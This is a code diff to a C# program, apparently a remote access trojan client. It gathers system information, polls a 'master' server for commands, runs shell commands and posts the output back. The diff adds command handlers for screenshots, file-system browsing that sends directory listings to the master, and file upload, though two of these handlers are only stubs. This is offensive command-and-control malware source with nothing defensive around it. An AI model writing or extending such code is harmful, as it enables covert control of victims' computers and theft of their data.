@@ -13,8 +13,6 @@ namespace TestAPP
         {
             SystemInfo sysInfo = SysInfoGrabber.getSystemInfo();
             obeyMaster(sysInfo);
-
-
         }
 
         static String getCommandJSONFromSysInfo(SystemInfo sysInfo)
@@ -36,8 +34,23 @@ namespace TestAPP
             String payload = ShellCommandUtil.getCommandOutputJSON(sysInfo.macAddress,command);
             WebClient.sendPostJSON(Constants.API_SLAVE_TEXT_RESPONSE_URL, payload);
         }
+        
+        static void getScreenShot(SystemInfo sysInfo, String command)
+        {
+            Console.WriteLine("[+] Taking Screenshot for Master");
+        }
 
+        static void uploadFileToMaster(SystemInfo sysInfo, String command)
+        {
+            Console.WriteLine("[+] Uploading File to Master");
+        }
 
+        static void browseFileSystem(SystemInfo sysInfo, String command)
+        {
+            Console.WriteLine("[+] Browsing FileSystem");
+            String payload = FileSystemUtil.getFilesNFolders(sysInfo,command);
+            WebClient.sendPostJSON(Constants.API_SLAVE_FILEBROWSE_RESPONSE_URL, payload);
+        }
 
         static void obeyMaster(SystemInfo sysInfo)
         {
@@ -61,6 +74,15 @@ namespace TestAPP
                 {
                     case Constants.SLAVE_COMMAND_KEY_VALUE_SHELL:
                         runShell(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
+                        break;
+                    case Constants.SLAVE_COMMAND_KEY_VALUE_SCREENSHOT:
+                        getScreenShot(sysInfo,command);
+                        break;
+                    case Constants.SLAVE_COMMAND_KEY_VALUE_FILEBROWSE:
+                        browseFileSystem(sysInfo,command);
+                        break;
+                    case Constants.SLAVE_COMMAND_KEY_VALUE_FILEDOWNLOAD:
+                        uploadFileToMaster(sysInfo,command);
                         break;
                 }
 
